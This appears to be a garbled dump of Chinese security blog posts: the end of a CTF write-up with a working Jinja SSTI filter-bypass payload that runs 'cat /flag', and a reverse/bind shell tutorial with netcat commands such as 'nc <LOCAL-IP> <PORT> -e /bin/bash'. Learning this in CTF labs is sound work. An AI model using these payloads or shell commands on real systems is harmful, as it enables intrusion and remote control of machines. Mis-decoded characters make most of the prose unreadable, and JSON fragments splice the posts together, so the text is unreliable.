ä¸ºå•ä¸ªæ–‡ä»¶çš„ä¿¡æ¯æä¾›äº†ä¸€ä¸ªé«˜çº§çš„é¢å‘å¯¹è±¡çš„æ¥å£ï¼Œå¯ä»¥ç”¨äºå¯¹æ–‡ä»¶å†…å®¹çš„éå†ã€æŸ¥æ‰¾ã€æ“ä½œç­‰ã€‚è¯¦æƒ…è¯·å‚è€ƒï¼šhttps://www.php.net/manual/zh/class.splfileobject.php è¯¥ç±»çš„æ„é€ æ–¹æ³•å¯ä»¥æ„é€ ä¸€ä¸ªæ–°çš„æ–‡ä»¶å¯¹è±¡ç”¨äºåç»­çš„è¯»å–ã€‚æˆ‘ä»¬å¯ä»¥åƒç±»ä¼¼ä¸‹é¢è¿™æ ·å»è¯»å–ä¸€ä¸ªæ–‡ä»¶çš„ä¸€è¡Œï¼š &lt;?php $context = new SplFileObject('/etc/passwd'); echo $context; ä½†æ˜¯è¿™æ ·ä¹Ÿåªèƒ½è¯»å–ä¸€è¡Œï¼Œè¦æƒ³å…¨éƒ¨è¯»å–çš„è¯è¿˜éœ€è¦å¯¹æ–‡ä»¶ä¸­çš„æ¯ä¸€è¡Œå†…å®¹è¿›è¡Œéå†ï¼š &lt;?php $context = new SplFileObject('/etc/passwd'); foreach($context as $f){ echo($f); } //D:\\labwork\\phpstudy_pro\\WWW\\1.txt ä½†è¿™é‡Œæˆ‘ä»¬æ˜¾ç„¶æ²¡åŠæ³•å»éå†ï¼Œå› æ­¤wpè¿™é‡Œè¯´åˆ©ç”¨ä¼ªåè®®ï¼ˆä¼°è®¡æ˜¯å› ä¸ºç»“æœå›æ˜¾çš„æ—¶å€™å°±æ˜¯åªæœ‰ä¸€è¡Œçš„ç¼˜æ•…å§ï¼‰ æœ€ç»ˆä¹Ÿæ˜¯æˆåŠŸè¯»å–åˆ° [GDOUCTF 2023]&lt;ez_ze&gt; è¿™é‡Œæµ‹è¯•ä¸€æ³¢å‘ç°è¿‡æ»¤äº†{{}}ã€ç‚¹å·ã€ä¸­æ‹¬å·ä»¥åŠä¸‹åˆ’çº¿ç­‰ç­‰ ç‚¹å·å’Œ[]çš„è¿‡æ»¤ç”¨attrå³å¯ï¼Œä¸‹åˆ’çº¿å°±æ„é€ ä¸€ä¸ªå°±è¡Œäº†ï¼Œå…ˆçœ‹åŸå‹payload {{lipsum|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('cat /flag')|attr('read')()}} å…ˆæ¥è·å–ä¸‹åˆ’çº¿å’Œç©ºæ ¼ {% print(lipsum|string|list) %} è¿™é‡Œå¯ä»¥çœ‹åˆ°ä¸‹æ ‡9å’Œ18åˆ†åˆ«æ˜¯ç©ºæ ¼ä¸ä¸‹åˆ’çº¿ æ¥ä¸‹æ¥å…ˆè·å–popï¼Œç„¶ååˆ©ç”¨ pop è·å–ä¸Šé¢çš„ç©ºæ ¼ä¸ä¸‹åˆ’çº¿ {% set pop=(dict(pop=1))|join %} {%set xhx=(lipsum|string|list)|attr(pop)(18)%} {% set kong=(lipsum|string|list)|attr(pop)(9) %} æ¥ä¸‹æ¥è·å–æ–œæ ï¼Œä¸‹å›¾å¯ä»¥çœ‹åˆ°configé‡Œé¢å«æœ‰æ–œæ ï¼Œè„šæœ¬éå†çœ‹çœ‹ä¸‹æ ‡ import requests strs = \"/\" url = \"http://node5.anna.nssctf.cn:28089/get_flag\" for i in range(1,500): data = { \"name\": \"{% set pop=(dict(pop=1))|join %}{% print(config|string|list)|attr(pop)(\"+str(i)+\") %}\" } response = requests.post(url=url, data=data) if strs in response.text: print(response.text) print(\"ç›®æ ‡æ˜¯:\", i) else: pass {% set re=(config|string|list)|attr(pop)(239) %}//æ–œæ  éšåè·å–globals {% set globals=(xhx,xhx,dict(globals=a)|join,xhx,xhx)|join %} ç”¨åŒæ ·çš„æ–¹å¼è·å–__getitem__ {% set geti=(xhx,xhx,dict(get=a,item=b)|join,xhx,xhx)|join %} å…¶ä»–å°±ä¸´æ‘¹ç€æ¥å³å¯ {% set pop=dict(pop=1)|join %} {% set kong=(lipsum|string|list)|attr(pop)(9) %} {% set xhx=(lipsum|string|list)|attr(pop)(18) %} {% set re=(config|string|list)|attr(pop)(239) %} {% set globals=(xhx,xhx,dict(globals=a)|join,xhx,xhx)|join %} {% set geti=(xhx,xhx,dict(get=a,item=b)|join,xhx,xhx)|join %} {% set o=dict(o=a,s=b)|join %} {% set po=dict(pop=a,en=b)|join %} {% set cmd=(dict(cat=a)|join,kong,re,dict(flag=a)|join)|join %} {% set read=dict(read=a)|join %} {% print(lipsum|attr(globals)|attr(geti)(o)|attr(po)(cmd)|attr(read)()) %} æˆåŠŸæ‹¿åˆ°flag å‚è€ƒæ–‡ç«  SSTIæ¨¡æ¿æ³¨å…¥ç»•è¿‡ï¼ˆè¿›é˜¶ç¯‡ï¼‰ GDOUCTF 2023]ez_ze GDOUCTF","tags":["CTFèµ›äº‹"],"categories":["CTFèµ›äº‹"]},{"title":"shellå­¦ä¹ ","path":"/2024/03/24/shell-xue-xi/","content":"0x01 ä»€ä¹ˆæ˜¯shell åœ¨æˆ‘ä»¬äº†è§£ å‘é€å’Œæ¥æ”¶shellä¹‹å‰ï¼ŒçŸ¥é“ shell å®é™…ä¸Šæ˜¯ä»€ä¹ˆéå¸¸é‡è¦ã€‚ç”¨æœ€ç®€å•çš„æœ¯è¯­æ¥è¯´ï¼Œæˆ‘ä»¬åœ¨ä¸å‘½ä»¤è¡Œç¯å¢ƒ(CLI)åšæ¥å£æ—¶æ‰€ä½¿ç”¨çš„å°±æ˜¯shellã€‚æ¢å¥è¯è¯´ï¼ŒLinux ä¸­å¸¸è§çš„ bash æˆ– sh ç¨‹åºå°±æ˜¯ shellï¼ŒWindows ä¸Šçš„ cmd.exe å’Œ Powershell ä¹Ÿæ˜¯shellã€‚åœ¨é’ˆå¯¹è¿œç¨‹ç³»ç»Ÿæ—¶ï¼Œæœ‰æ—¶å¯ä»¥å¼ºåˆ¶åº”ç”¨ç¨‹åºåœ¨æœåŠ¡å™¨ä¸Šè¿è¡Œ(ä¾‹å¦‚ webserver)æ¥æ‰§è¡Œä»»æ„ä»£ç ï¼Œå½“è¿™ç§æƒ…å†µå‘ç”Ÿæ—¶ï¼Œæˆ‘ä»¬å¸Œæœ›ä½¿ç”¨è¿™ä¸ªåˆå§‹è®¿é—®æ¥è·å¾—åœ¨ç›®æ ‡ä¸Šè¿è¡Œçš„ shellã€‚ ç®€å•åœ°è¯´ï¼Œæˆ‘ä»¬å¯ä»¥å¼ºåˆ¶è¿œç¨‹æœåŠ¡å™¨å‘æˆ‘ä»¬å‘é€å¯¹æœåŠ¡å™¨çš„å‘½ä»¤è¡Œè®¿é—®(åå‘ shell) ï¼Œæˆ–è€…åœ¨æœåŠ¡å™¨ä¸Šæ‰“å¼€ä¸€ä¸ªç«¯å£ï¼Œæˆ‘ä»¬å¯ä»¥è¿æ¥åˆ°è¿™ä¸ªç«¯å£ä»¥æ‰§è¡Œæ›´å¤šçš„å‘½ä»¤(ç»‘å®š shell)ã€‚ æˆ‘ä»¬å°†åœ¨æ•´ä¸ªæˆ¿é—´ä¸­æ›´è¯¦ç»†åœ°ä»‹ç»è¿™ä¸¤ç§åœºæ™¯ã€‚ è¿™ä¸ªæˆ¿é—´çš„æ ¼å¼å¦‚ä¸‹ï¼š æˆ¿é—´çš„å¤§éƒ¨åˆ†å†…å®¹ç”±ä¿¡æ¯ç»„æˆï¼Œä»£ç å—å’Œå±å¹•æˆªå›¾ä¸­ç»™å‡ºäº†ç¤ºä¾‹ã€‚ æˆ¿é—´çš„æœ€åä¸¤é¡¹ä»»åŠ¡ä¸­æœ‰ä¸¤å°è™šæ‹Ÿæœºâ€”â€”ä¸€å°æ˜¯ Linuxï¼Œä¸€å°æ˜¯ Windowsã€‚è¿™äº›å¯ä»¥ç”¨æ¥ç»ƒä¹ æ‰€æ¼”ç¤ºçš„æŠ€æœ¯ã€‚ ä»»åŠ¡ 13 ä¸­æœ‰ç¤ºä¾‹ç»ƒä¹ é¢˜ã€‚è¯·éšæ„å®Œæˆè¿™äº›ç»ƒä¹ ï¼Œæˆ–è€…åœ¨å®Œæˆä»»åŠ¡æ—¶æŒ‰ç…§ä»»åŠ¡è¿›è¡Œæ“ä½œã€‚ è¯ä¸å¤šè¯´ï¼Œè®©æˆ‘ä»¬å¼€å§‹å§ï¼ 0x02 å·¥å…·ä»‹ç» æˆ‘ä»¬å°†ä½¿ç”¨å¤šç§å·¥å…·æ¥æ¥æ”¶åå‘ shell å’Œå‘é€ç»‘å®š shellã€‚ä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬éœ€è¦æ¶æ„çš„ shell ä»£ç ï¼Œä»¥åŠä¸ç”Ÿæˆçš„ shell è¿›è¡Œæ¥å£çš„æ–¹æ³•ã€‚æˆ‘ä»¬å°†åœ¨ä¸‹é¢ç®€è¦è®¨è®ºå…¶ä¸­çš„æ¯ä¸€é¡¹: Netcat Netcat æ˜¯ä¼ ç»Ÿçš„ç½‘ç»œâ€œç‘å£«å†›åˆ€â€ã€‚å®ƒç”¨äºæ‰‹åŠ¨æ‰§è¡Œå„ç§ç½‘ç»œäº¤äº’ï¼ŒåŒ…æ‹¬åœ¨æšä¸¾æ—¶æŠ“å–bannerï¼ˆæ¨ªå¹…ï¼‰ï¼Œæ›´é‡è¦çš„æ˜¯ï¼Œå®ƒå¯ä»¥ç”¨äºæ¥æ”¶åå‘shellä»¥åŠè¿æ¥åˆ°è¿œç¨‹ç«¯å£ä»¥ç»‘å®šç›®æ ‡ç³»ç»Ÿä¸Šçš„shellã€‚Netcat shellsåœ¨é»˜è®¤æƒ…å†µä¸‹éå¸¸ä¸ç¨³å®š(å®¹æ˜“ä¸¢å¤±) ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€å®šæŠ€æœ¯æ¥åŠ ä»¥æ”¹è¿›ã€‚ Socat Socat å°±åƒå‡çº§ç‰ˆçš„ Netcatã€‚å®ƒå¯ä»¥åšå’ŒNetcatç›¸åŒçš„äº‹æƒ…ï¼Œè€Œä¸”èƒ½å¤Ÿåšæ›´å¤šã€‚Socat shells é€šå¸¸æ¯”å¼€ç®±å³ç”¨çš„ Netcat shellsæ›´ç¨³å®šã€‚ä»è¿™ä¸ªæ„ä¹‰ä¸Šè¯´ï¼Œå®ƒè¿œè¿œä¼˜äº netcat; ç„¶è€Œï¼ŒSocatä¹Ÿæœ‰ä¸¤ä¸ªå¤§çš„ç¼ºé™·: Socatè¯­æ³•æ›´åŠ å›°éš¾ åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œå‡ ä¹æ¯ä¸ª Linux å‘è¡Œç‰ˆéƒ½ä¼šå®‰è£…Netcatï¼Œä½†å¾ˆå°‘ä¼šé»˜è®¤å®‰è£…Socat Netcatå’ŒSocatåœ¨ Windows ä¸Šéƒ½æœ‰.exe ç‰ˆæœ¬ Metasploit â€“ multi/handler Metasploit æ¡†æ¶çš„ auxiliary/multi/handler æ¨¡å—ä¸ socat å’Œ netcat ä¸€æ ·ï¼Œå¯ä»¥ç”¨äºæ¥æ”¶åå‘ shellã€‚ç”±äºæ˜¯ Metasploit æ¡†æ¶çš„ä¸€éƒ¨åˆ†ï¼Œmulti/handler æä¾›äº†ä¸€ç§è·å¾—ç¨³å®š shell çš„å®Œå…¨æˆç†Ÿçš„æ–¹æ³•ï¼Œå¹¶æä¾›äº†å¤šç§è¿›ä¸€æ­¥æ”¹è¿›æ‰€æ•è·çš„ shell çš„é€‰é¡¹ã€‚ multi/handleræ¨¡å—æ˜¯å¯ä»¥ä¸ meterpreter shell è¿›è¡Œäº¤äº’çš„æ–¹æ³•ï¼Œå¹¶ä¸”ä¹Ÿæ˜¯å¤„ç†åˆ†æ®µpayloadï¼ˆæœ‰æ•ˆè½½è·ï¼‰çš„æœ€ç®€å•æ–¹æ³•ã€‚ Msfvenom ä¸multi/handlerä¸€æ ·ï¼Œmsfvenomåœ¨æŠ€æœ¯ä¸Šä¹Ÿæ˜¯ Metasploit æ¡†æ¶çš„ä¸€éƒ¨åˆ†ï¼Œç„¶è€Œï¼Œå®ƒæ˜¯ä½œä¸ºä¸€ä¸ªç‹¬ç«‹çš„å·¥å…·å‘å¸ƒçš„ã€‚msfvenomç”¨äºåŠ¨æ€ç”Ÿæˆpayloadï¼ŒMsfvenomå¯ä»¥äº§ç”Ÿé™¤äº†åå‘shellå’Œç»‘å®šshellä»¥å¤–çš„å…¶ä»–payloadï¼ˆæœ‰æ•ˆè½½è·ï¼‰ã€‚ é™¤äº†æˆ‘ä»¬å·²ç»ä»‹ç»è¿‡çš„å·¥å…·ä¹‹å¤–ï¼Œè¿˜æœ‰è®¸å¤šç”¨ä¸åŒç¼–ç¨‹è¯­è¨€ä¹¦å†™çš„ å…³äºshellåˆ©ç”¨çš„é¡¹ç›®å’Œèµ„æ–™ï¼Œæ¯”å¦‚ï¼š https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Reverse Shell Cheatsheet.md https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet Kali Linux é¢„å…ˆå®‰è£…äº†å„ç§webshellsï¼Œé»˜è®¤è·¯å¾„æ˜¯ï¼š/usr/share/webshells è¿˜æœ‰ä¸€ä¸ªé¡¹ç›®è™½ç„¶ä¸»è¦æ˜¯å‘æŒ¥å­—å…¸åŠŸèƒ½ï¼Œä½†æ˜¯ä¹ŸåŒ…å«äº†ä¸€äº›éå¸¸æœ‰ç”¨çš„ ç”¨äºè·å–shellçš„ä»£ç ï¼šhttps://github.com/danielmiessler/SecLists 0x03 shellç±»å‹ ä»æ›´é«˜çš„å±‚æ¬¡ä¸Šæ¥è¯´ï¼Œå½“æ¶‰åŠåˆ°ä¸€ä¸ªå¯åˆ©ç”¨ç›®æ ‡æ—¶ï¼Œæˆ‘ä»¬åªå¯¹ä¸¤ç§ shell æ„Ÿå…´è¶£: åå‘ shell ï¼Œ ç»‘å®š shellã€‚ Reverse shellsï¼ˆåå‘shellï¼‰ åå‘ shell æ˜¯æŒ‡ç›®æ ‡è¢«è¿«æ‰§è¡Œä¸€æ®µä»£ç  å¹¶ä»¥æ­¤è¿æ¥åˆ°ä½ çš„è®¡ç®—æœºï¼Œåœ¨ä½ è‡ªå·±çš„è®¡ç®—æœºä¸Šï¼Œä½ å¯ä»¥ä½¿ç”¨å‰é¢æåˆ°çš„å·¥å…·ä¹‹ä¸€æ¥è®¾ç½®ä¸€ä¸ªç”¨äºæ¥æ”¶è¿æ¥çš„ç›‘å¬å™¨ã€‚ åå‘ shell æ˜¯ç»•è¿‡é˜²ç«å¢™è§„åˆ™çš„ä¸€ä¸ªå¥½æ–¹æ³•ï¼Œå› ä¸ºé˜²ç«å¢™è§„åˆ™ å¯èƒ½ä¼šé˜»æ­¢ä½ æ­£å‘è¿æ¥åˆ°ç›®æ ‡ä¸Šçš„ä»»æ„ç«¯å£ï¼›ç„¶è€Œï¼Œæœ‰ä¸€ä¸ªç¼ºç‚¹æ˜¯ï¼šå½“ä»äº’è”ç½‘ä¸Šçš„ä¸€å°æœºå™¨æ¥æ”¶ shell æ—¶ï¼Œä½ éœ€è¦å…ˆé…ç½®å¥½ä½ è‡ªå·±çš„ç½‘ç»œã€‚ Bind shellsï¼ˆç»‘å®šshellï¼‰ å½“åœ¨ç›®æ ‡ä¸Šæ‰§è¡Œçš„ä»£ç ç”¨äºå¯åŠ¨ä¸€ä¸ªç›´æ¥è¿æ¥åˆ°ç›®æ ‡æœºå™¨çš„shellçš„ç›‘å¬å™¨æ—¶ï¼Œå°±ç§°ä¸ºç»‘å®š shellã€‚ç„¶åï¼Œè¿™å°†ä½¿ç›®æ ‡å‘äº’è”ç½‘å¼€æ”¾ï¼Œè¿™æ„å‘³ç€ä½ å¯ä»¥è¿æ¥åˆ°ä»£ç æ‰“å¼€çš„ç«¯å£ï¼Œå¹¶é€šè¿‡è¿™ç§æ–¹å¼è·å¾—è¿œç¨‹ä»£ç æ‰§è¡Œã€‚ è¿™æ ·åšçš„å¥½å¤„æ˜¯ ä¸éœ€è¦ä½ åœ¨è‡ªå·±çš„ç½‘ç»œä¸Šè¿›è¡Œä»»ä½•é…ç½®ï¼Œä½†æ˜¯è¯¥è¡Œä¸ºå¯èƒ½ä¼šè¢«ä¿æŠ¤ç›®æ ‡çš„é˜²ç«å¢™åŠ ä»¥é˜»æ­¢ã€‚ ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œåå‘ shell æ›´å®¹æ˜“æ‰§è¡Œå’Œè°ƒè¯•ã€‚ åå‘shellçš„ä¾‹å­ è¯·çœ‹ä¸‹é¢çš„å›¾ç‰‡ã€‚ åœ¨å·¦è¾¹ï¼Œæˆ‘ä»¬æœ‰ä¸€ä¸ªåå‘ shell ä¾¦å¬å™¨â€”â€”å®ƒæ¥æ”¶è¿æ¥ï¼Œè€Œå³è¾¹æ˜¯å‘é€åå‘ shell çš„æ¨¡æ‹Ÿç›®æ ‡ã€‚å®é™…ä¸Šï¼Œè¿™æ›´å¯èƒ½æ˜¯é€šè¿‡è¿œç¨‹ç½‘ç«™ä¸Šçš„ä»£ç æ³¨å…¥æˆ–ç±»ä¼¼çš„æ³¨å…¥æ¥å®Œæˆçš„ã€‚ æŠŠå·¦è¾¹çš„å›¾åƒæƒ³è±¡æˆä½ è‡ªå·±çš„ç”µè„‘ï¼ŒæŠŠå³è¾¹çš„å›¾åƒæƒ³è±¡æˆä½ çš„ç›®æ ‡ã€‚ #åœ¨æ”»å‡»æœºï¼ˆä½ çš„kaliç³»ç»Ÿï¼‰ä¸Š: sudo nc -lvnp 443 #åœ¨ç›®æ ‡æœºä¸Šï¼š nc &lt;LOCAL-IP&gt; &lt;PORT&gt; -e /bin/bash #&lt;LOCAL-IP&gt; &lt;PORT&gt; æŒ‡çš„æ˜¯æ”»å‡»æœºä¸Šçš„ipå’Œæ­£åœ¨ç›‘å¬çš„ç«¯å£ æ³¨æ„ï¼Œåœ¨å³è¾¹è¿è¡Œå‘½ä»¤ä¹‹åï¼Œå·¦è¾¹çš„ç›‘å¬å™¨å°†æ¥æ”¶åˆ°ä¸€ä¸ªè¿æ¥ï¼Œè¿æ¥æˆåŠŸåï¼Œè¿è¡Œ whoami å‘½ä»¤ï¼Œèƒ½çœ‹åˆ°æˆ‘ä»¬èƒ½å¤Ÿä½œä¸ºç›®æ ‡ç”¨æˆ·å»æ‰§è¡Œå‘½ä»¤ï¼Œé‡è¦çš„æ˜¯ï¼šæˆ‘ä»¬åœ¨ç›‘å¬æˆ‘ä»¬è‡ªå·±çš„æ”»å‡»æœºä¸Šçš„ç«¯å£ï¼Œç”±ç›®æ ‡æœºå‘é€è¿æ¥åˆ°æ”»å‡»æœºã€‚ ç»‘å®šshellçš„ä¾‹å­ ç»‘å®š shell ä¸å¤ªå¸¸è§ï¼Œä½†ä»ç„¶éå¸¸æœ‰ç”¨ã€‚ è¯·çœ‹ä¸‹é¢çš„å›¾ç‰‡ã€‚åŒæ ·ï¼Œå·¦è¾¹æ˜¯æ”»å‡»è€…çš„ç”µè„‘ï¼Œå³è¾¹æ˜¯æ¨¡æ‹Ÿç›®æ ‡ã€‚ä¸ºäº†ç¨å¾®æ”¹å˜ä¸€ä¸‹ï¼Œè¿™æ¬¡æˆ‘ä»¬å°†ä½¿ç”¨ Windows ç›®æ ‡ã€‚ é¦–å…ˆï¼Œæˆ‘ä»¬åœ¨å³è¾¹çš„ç›®æ ‡ä¸Šå¯åŠ¨ä¸€ä¸ªç›‘å¬å™¨â€“è¿™ä¸€æ¬¡ï¼Œæˆ‘ä»¬å‘Šè¯‰å®ƒæ‰§è¡Œcmd.exeï¼Œç„¶åï¼Œå½“ç›®æ ‡æœºä¸Šçš„ç›‘å¬å™¨å¯åŠ¨å¹¶è¿è¡Œæ—¶ï¼Œæˆ‘ä»¬ä»è‡ªå·±çš„æœºå™¨å‘é€è¿æ¥åˆ°ç›®æ ‡æœºä¸Šæ–°æ‰“å¼€çš„ç«¯å£ #åœ¨ç›®æ ‡æœºä¸Šè®¾ç½®ç›‘å¬å™¨ï¼Œå½“ç›‘å¬å™¨è¢«è§¦å‘æ—¶ æ‰§è¡Œcmd.exeç¨‹åºï¼š nc -lvnp &lt;port&gt; -e \"cmd.exe\" #åœ¨æ”»å‡»æœºä¸Šå‘å‡ºè¿æ¥è¯·æ±‚ï¼š nc MACHINE_IP &lt;port&gt; #MACHINE_IP &lt;port&gt; æŒ‡çš„æ˜¯ç›®æ ‡æœºçš„ipå’Œæ‰“å¼€çš„ç«¯å£ æ­£å¦‚ä½ æ‰€çœ‹åˆ°çš„ï¼Œè¿™å†æ¬¡ä¸ºæˆ‘ä»¬æä¾›äº†åœ¨è¿œç¨‹è®¡ç®—æœºä¸Šæ‰§è¡Œä»£ç çš„æœºä¼šã€‚ æ³¨æ„ï¼Œè¿™ç§æƒ…å†µä¸æ˜¯ Windows ç‰¹æœ‰çš„ï¼Œé‡è¦çš„æ˜¯è¦æ˜ç™½ï¼Œæˆ‘ä»¬æ­£åœ¨ç›®æ ‡ä¸Šå¼€å¯ç›‘å¬å™¨ï¼Œç„¶åç”¨æˆ‘ä»¬è‡ªå·±çš„æœºå™¨ä¸»åŠ¨å»è¿æ¥åˆ°å®ƒï¼ˆç›®æ ‡ï¼‰ã€‚ æœ€åä¸€ä¸ªä¸æœ¬å°èŠ‚ç›¸å…³çš„æ¦‚å¿µæ˜¯äº¤äº’æ€§ã€‚shellå¯ä»¥æ˜¯äº¤äº’å¼çš„ï¼Œä¹Ÿå¯ä»¥æ˜¯éäº¤äº’å¼çš„ã€‚ äº¤äº’å¼shell å¦‚æœä½ ä½¿ç”¨è¿‡ Powershellã€ Bashã€ Zshã€ sh æˆ–ä»»ä½•å…¶ä»–æ ‡å‡†çš„CLIï¼ˆå‘½ä»¤è¡Œï¼‰ç¯å¢ƒï¼Œé‚£ä¹ˆä½ å·²ç»æ¥è§¦è¿‡äº¤äº’å¼shellã€‚ äº¤äº’å¼shellå…è®¸ä½ åœ¨æ‰§è¡Œç¨‹åºä¹‹åä¸å®ƒä»¬å‘ç”Ÿäº¤äº’ã€‚ ä¾‹å¦‚ï¼Œä½¿ç”¨SSHç™»å½•: åœ¨è¿™é‡Œï¼Œä½ å¯ä»¥çœ‹åˆ°å®ƒä»¥äº¤äº’æ–¹å¼è¯·æ±‚ç”¨æˆ·è¾“å…¥ yes æˆ– no ä»¥ç»§ç»­è¿›è¡Œç™»å½•è¿æ¥ã€‚è¿™æ˜¯ä¸€ä¸ªäº¤äº’å¼ç¨‹åºï¼Œå®ƒéœ€è¦ä¸€ä¸ªäº¤äº’å¼ shell æ‰èƒ½è¿è¡Œã€‚ éäº¤äº’å¼shell éäº¤äº’å¼shell ä¸ä¼šç»™ä½ å‘ç”Ÿäº¤äº’çš„æœºä¼šã€‚åœ¨éäº¤äº’å¼shellä¸­ï¼Œåªèƒ½ä½¿ç”¨ä¸éœ€è¦ç”¨æˆ·äº¤äº’å°±èƒ½æ­£å¸¸è¿è¡Œçš„ç¨‹åºã€‚ä¸å¹¸çš„æ˜¯ï¼Œå¤§å¤šæ•°ç®€å•çš„åå‘å’Œç»‘å®š shell éƒ½æ˜¯éäº¤äº’å¼çš„ï¼Œè¿™å¯èƒ½ä¼šä½¿è¿›ä¸€æ­¥çš„æ¼æ´åˆ©ç”¨å˜å¾—æ›´åŠ æ£˜æ‰‹ã€‚ è®©æˆ‘ä»¬çœ‹çœ‹åœ¨éäº¤äº’å¼ shell ä¸­è¿è¡Œ SSH æ—¶ä¼šå‘ç”Ÿä»€ä¹ˆ: ç”±ä¸Šå›¾å¯ä»¥çœ‹åˆ°ï¼Œwhoami å‘½ä»¤(éäº¤äº’å¼)æ‰§è¡Œå¾—éå¸¸å®Œç¾ï¼Œä½† ssh å‘½ä»¤(äº¤äº’å¼)æ ¹æœ¬ä¸ä¼šç»™æˆ‘ä»¬ä»»ä½•è¾“å‡ºã€‚ä¸è¿‡ï¼Œæœ‰è¶£çš„æ˜¯ï¼Œäº¤äº’å¼å‘½ä»¤çš„è¾“å‡ºç¡®å®å¯ä»¥åˆ°è¾¾æŸä¸ªåœ°æ–¹ã€‚ å¯ä»¥è¯´ï¼Œäº¤äº’å¼ç¨‹åºä¸èƒ½åœ¨éäº¤äº’å¼ shell ä¸­å·¥ä½œã€‚æ­¤å¤–ï¼Œåœ¨æˆªå›¾ä¸­å¯ä»¥çœ‹åˆ°ä¸€ä¸ªåä¸ºlistenerçš„å‘½ä»¤ï¼Œæ­¤å‘½ä»¤æ˜¯ç”¨äºæ¼”ç¤ºçš„æ”»å‡»æœºå™¨è‡ªå®šä¹‰çš„ç‹¬æœ‰åˆ«åï¼Œæ˜¯sudo rlwrap nc -lvnp 443 å‘½ä»¤çš„é€Ÿè®°æ–¹æ³•ã€‚é™¤éä½ åœ¨æœ¬åœ°é…ç½®äº†è¿™ä¸ªåˆ«åï¼Œå¦åˆ™å®ƒä¸ä¼šåœ¨ä»»ä½•å…¶ä»–æœºå™¨ä¸Šå·¥ä½œã€‚ 0x04 Netcat Netcatå»ºç«‹åå‘shell å»ºç«‹åå‘ shell éœ€è¦æ‰§è¡Œåå‘shell ä»£ç ä»¥åŠè®¾ç½®ç›‘å¬å™¨ï¼Œæ‰§è¡Œ shellcode çš„æ–¹æ³•æœ‰å¾ˆå¤šï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆä»è®¾ç½®ç›‘å¬å™¨å¼€å§‹ã€‚ ä½¿ç”¨ Linux å¯åŠ¨ netcat ç›‘å¬å™¨çš„è¯­æ³•å¦‚ä¸‹: nc -lvnp &lt;port-number&gt; -l #ç”¨æ¥å‘Šè¯‰netcatè¿™å°†æ˜¯ä¸€ä¸ªç›‘å¬å™¨listener -v #ç”¨äºè¯·æ±‚è¯¦ç»†è¾“å‡º -n #å‘Šè¯‰netcatä¸è¦è§£æä¸»æœºåæˆ–è€…ä½¿ç”¨DNS -p #æŒ‡å®šç«¯å£ #netcatå¸¸ç”¨å‚æ•°åˆ—è¡¨ï¼š -lï¼šç”¨äºæŒ‡å®šncå°†å¤„äºä¾¦å¬æ¨¡å¼ã€‚æŒ‡å®šè¯¥å‚æ•°ï¼Œåˆ™æ„å‘³ç€ncè¢«å½“ä½œserverï¼Œä¾¦å¬å¹¶æ¥å—è¿æ¥ï¼Œè€Œéå‘å…¶å®ƒåœ°å€å‘èµ·è¿æ¥ã€‚ -pï¼šæœ¬åœ°ç«¯å£ -sï¼šæŒ‡å®šå‘é€æ•°æ®çš„æºIPåœ°å€ï¼Œé€‚ç”¨äºå¤šç½‘å¡æœº -uï¼šæŒ‡å®šncä½¿ç”¨UDPåè®®ï¼Œé»˜è®¤ä¸ºTCP -vï¼šè¾“å‡ºäº¤äº’æˆ–å‡ºé”™ä¿¡æ¯ï¼Œæ–°æ‰‹è°ƒè¯•æ—¶å°¤ä¸ºæœ‰ç”¨ -wï¼šè¶…æ—¶ç§’æ•°ï¼Œåé¢è·Ÿæ•°å­— -zï¼šè¡¨ç¤ºzeroï¼Œè¡¨ç¤ºæ‰«ææ—¶ä¸å‘é€ä»»ä½•æ•°æ® -iï¼šsecs å»¶æ—¶çš„é—´éš” -Lï¼šè¿æ¥å…³é—­ï¼Œä»ç„¶ç»§ç»­ç›‘å¬ -nï¼šæŒ‡å®šæ•°å­—ipï¼Œä¸èƒ½ç”¨hostname -oï¼šfile è®°å½•16è¿›åˆ¶çš„ä¼ è¾“ -rï¼šéšæœºæœ¬åœ°åŠè¿œç¨‹ç«¯å£ -tï¼šä½¿ç”¨Telnetäº¤äº’æ–¹å¼ ä¸Šä¸€ä¸ªå°èŠ‚ä¸­ä½¿ç”¨çš„ç«¯å£æ˜¯443ã€‚å®é™…ä¸Šï¼Œä½ å¯ä»¥ä½¿ç”¨ä»»ä½•ä½ å–œæ¬¢çš„ç«¯å£ï¼Œåªè¦è¿™ä¸ªç«¯å£è¿˜æ²¡æœ‰è¢«æœåŠ¡æ‰€å ç”¨ã€‚è¯·æ³¨æ„ï¼šå¦‚æœé€‰æ‹©ä½¿ç”¨ä½äº1024çš„ç«¯å£ï¼Œåˆ™åœ¨å¯åŠ¨ç›‘å¬å™¨æ—¶éœ€è¦ä½¿ç”¨ sudoã€‚ä½¿ç”¨ä¸€ä¸ªä¼—æ‰€å‘¨çŸ¥çš„ç«¯å£å·(80ã€443æˆ–53)é€šå¸¸æ˜¯ä¸€ä¸ªå¥½ä¸»æ„ï¼Œå› ä¸ºè¿™æ›´æœ‰å¯èƒ½ç»•è¿‡ç›®æ ‡çš„å‡ºç«™é˜²ç«å¢™è§„åˆ™ ä¾‹å­ï¼š sudo nc -lvnp 443 ç„¶åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»»æ„æ•°é‡çš„payloadï¼ˆæœ‰æ•ˆè½½è·ï¼‰è¿æ¥åˆ°è¿™ä¸ªç›®æ ‡ï¼Œå…·ä½“æƒ…å†µå–å†³äºç›®æ ‡ç¯å¢ƒã€‚ Netcatå»ºç«‹ç»‘å®šshell å¦‚æœæˆ‘ä»¬å¸Œæœ›åœ¨ç›®æ ‡ä¸Šè·å¾—ç»‘å®š shellï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å‡è®¾åœ¨ç›®æ ‡æœºçš„é€‰å®šç«¯å£ä¸Šå·²ç»æœ‰ä¸€ä¸ªç›‘å¬å™¨æ­£åœ¨ç­‰å¾…æˆ‘ä»¬: 